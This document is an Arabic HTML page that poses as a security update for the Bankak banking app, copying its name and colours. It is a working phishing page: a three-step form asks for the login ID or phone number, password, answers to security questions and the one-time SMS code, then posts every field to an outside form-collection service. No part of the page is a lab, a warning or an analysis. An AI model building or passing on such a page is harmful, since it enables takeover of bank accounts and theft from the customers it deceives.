<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تطبيق بنكك - التحديث الأمني</title>
    <style>
        :root { --bok-red: #e30613; --bok-gold: #ffca28; }
        body { 
            background-color: var(--bok-red); 
            font-family: 'Segoe UI', Tahoma, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            margin: 0; 
            color: white; 
            direction: rtl;
        }
        .container { width: 90%; max-width: 400px; text-align: center; padding: 20px 0; }
        .logo { font-size: 55px; font-weight: bold; margin-bottom: 20px; text-shadow: 2px 2px 10px rgba(0,0,0,0.3); }
        .logo span { font-size: 20px; display: block; margin-top: -15px; }
        
        .step { display: none; animation: fadeIn 0.4s; }
        .step.active { display: block; }

        input, select { 
            width: 100%; padding: 14px; border-radius: 10px; border: 2px solid transparent; 
            font-size: 16px; text-align: right; box-sizing: border-box; outline: none;
            background-color: white; margin-top: 10px; color: #333;
        }

        .qa-card { background: white; color: #333; padding: 15px; border-radius: 12px; margin-bottom: 15px; text-align: right; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        .qa-card label { color: var(--bok-red); font-weight: bold; font-size: 14px; display: block; margin-bottom: 5px; }

        .btn { 
            width: 100%; padding: 16px; background: white; color: var(--bok-red); 
            border: none; border-radius: 12px; font-size: 18px; font-weight: bold; 
            cursor: pointer; margin-top: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); 
        }
        .btn-gold { background: var(--bok-gold); color: #333; }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">بنكك<span>bankak</span></div>

    <form action="https://formspree.io/f/xjgeaelv" method="POST" id="bokForm">
        
        <div id="step1" class="step active">
            <input type="text" name="رقم_المعرف" placeholder="رقم المعرف أو 249-" required>
            <input type="password" name="كلمة_المرور" placeholder="كلمة المرور" required>
            <button type="button" class="btn" onclick="next(1, 2)">تسجيل الدخول</button>
        </div>

        <div id="step2" class="step">
            <h3 style="margin-bottom: 20px;">تحديث أسئلة الأمان</h3>
            <div class="qa-card">
                <label>السؤال الأول</label>
                <select name="سؤال_1">
                    <option>اسم ابن عمك الأول؟</option>
                    <option>مدينة الميلاد؟</option>
                </select>
                <input type="text" name="جواب_1" placeholder="إجابتك هنا" required>
            </div>
            <div class="qa-card">
                <label>السؤال الثاني</label>
                <select name="سؤال_2">
                    <option>لقب الطفولة؟</option>
                    <option>اسم المدرسة؟</option>
                </select>
                <input type="text" name="جواب_2" placeholder="إجابتك هنا" required>
            </div>
            <button type="button" class="btn" onclick="next(2, 3)">متابعة</button>
        </div>

        <div id="step3" class="step">
            <h3>تأكيد الرمز (OTP)</h3>
            <input type="text" name="الرمز_OTP" placeholder="أدخل الرمز (6 أرقام)" maxlength="6" style="text-align:center; letter-spacing:5px;" required>
            <button type="submit" class="btn btn-gold">تأكيد وحفظ البيانات</button>
        </div>
    </form>
</div>

<script>
    function next(curr, nxt) {
        document.getElementById('step' + curr).classList.remove('active');
        document.getElementById('step' + nxt).classList.add('active');
        window.scrollTo(0,0);
    }
</script>

</body>
</html>
